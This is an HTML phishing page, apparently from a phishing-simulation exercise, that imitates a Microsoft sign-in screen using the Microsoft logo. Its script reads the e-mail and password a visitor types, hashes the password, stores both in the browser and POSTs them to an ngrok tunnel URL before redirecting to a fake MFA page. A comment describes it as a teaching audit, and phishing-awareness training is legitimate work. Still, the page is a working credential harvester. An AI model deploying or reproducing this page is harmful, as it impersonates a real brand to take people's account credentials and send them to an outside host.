<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login - Office Simulado</title>
  <link rel="stylesheet" href="css/style.css" />
</head>
<body>
  <div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
    <h2>Entrar</h2>
    <form onsubmit="event.preventDefault(); salvarCredenciais();">
      <input type="email" id="email" placeholder="E-mail" required />
      <input type="password" id="senha" placeholder="Senha" required />
      <button type="submit">Avan√ßar</button>
    </form>
    <a href="#">N√£o consegue acessar sua conta?</a>
  </div>

  <!-- Biblioteca para SHA-256 -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>

  <script>
  function salvarCredenciais() {
    const email = document.getElementById("email").value;
    const senha = document.getElementById("senha").value;

    const senhaHash = CryptoJS.SHA256(senha).toString();

    const dadosUsuario = {
      email: email,
      senhaHash: senhaHash
    };

    // Salva temporariamente no navegador
    localStorage.setItem("usuarioTemp", JSON.stringify(dadosUsuario));

    // üîÑ Envia para o servidor local
    fetch("https://400920d4110a.ngrok-free.app/dados", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(dadosUsuario)
    })
    .then(res => {
      if (res.ok) {
        console.log("‚úÖ Dados enviados com sucesso!");
      } else {
        console.warn("‚ùå Erro ao enviar os dados.");
      }
      // Avan√ßa mesmo com falha de envio, j√° que √© s√≥ auditoria did√°tica
      window.location.href = "mfa.html";
    })
    .catch(err => {
      console.error("‚ö†Ô∏è Erro de conex√£o:", err);
      // Avan√ßa mesmo assim
      window.location.href = "mfa.html";
    });
  }
</script>

</body>
</html>
